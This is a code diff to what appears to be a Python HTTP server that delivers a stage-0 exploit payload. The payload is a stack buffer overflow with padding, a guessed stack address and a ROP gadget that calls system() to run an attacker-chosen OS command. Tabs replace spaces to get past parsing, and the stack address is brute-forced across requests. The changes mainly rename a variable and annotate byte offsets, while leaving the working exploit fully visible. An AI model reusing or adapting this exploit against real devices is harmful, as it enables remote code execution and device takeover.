@@ -9,8 +9,8 @@ from typing       import Dict
 class HttpHandler(BaseHTTPRequestHandler):
 
     protocol_version = "HTTP/1.1"
-    payload = "leg"
-    cmd_ptr = 0xbeffc104+396
+    payload  = "leg"
+    cmd_addr = 0xbeffc104+396
     
     def version_string(self) -> str:
         return "circled.server"
@@ -30,8 +30,8 @@ class HttpHandler(BaseHTTPRequestHandler):
         return b
     
     def serve_stage0_payload(self, database: bool = False) -> bytes:
-        payload = HttpHandler.payload
-        cmd_ptr = HttpHandler.cmd_ptr
+        payload  = HttpHandler.payload
+        cmd_addr = HttpHandler.cmd_addr
 
         # Serve requests for database.bin
         if database:
@@ -53,18 +53,18 @@ class HttpHandler(BaseHTTPRequestHandler):
         cmd = "touch$\t/tmp/st0;" + cmd.replace(" ", "\t") + ";#"
 
         # Generate payload
-        p  = b"A"*368
-        p += cmd_ptr.to_bytes(4, "little")              # g0_r6_val (stack addr. of OS command)
-        p += b"B"*20
-        p += b"\xb8\xc9\x00\x00"                        # g0_pc_val (code addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
+        p  = b"A"*368                                   # [   0: 367]
+        p += cmd_addr.to_bytes(4, "little")             # [ 368: 371] g0_r6_val (stack addr. of OS command)
+        p += b"B"*20                                    # [ 372: 391]
+        p += b"\xb8\xc9\x00\x00"                        # [ 392: 395] g0_pc_val (code addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
         max_cmd_len = 1024-len(p)-2-2
-        p += b"X"*max(0, (max_cmd_len-len(cmd))) + b";" # Fill up with an inexisting command
-        p += bytes(cmd, "UTF-8")[:max_cmd_len]          # OS command to execute
+        p += b"X"*max(0, (max_cmd_len-len(cmd))) + b";" # [ 396:   L] Fill up with an nonexistent command
+        p += bytes(cmd, "UTF-8")[:max_cmd_len]          # [ L+1:1020] OS command to execute
         p += b" X"                                      # String separator: sscanf(str, "%s %s", ...)
-        print(f"[*] Stage 0 payload: 0x{cmd_ptr:08x} '{cmd:s}'")
+        print(f"[*] Stage 0 payload: 0x{cmd_addr:08x} '{cmd:s}'")
 
         # Brute force the stack
-        HttpHandler.cmd_ptr = cmd_ptr - 0x1000
+        HttpHandler.cmd_addr = cmd_addr - 0x1000
 
         return p
     
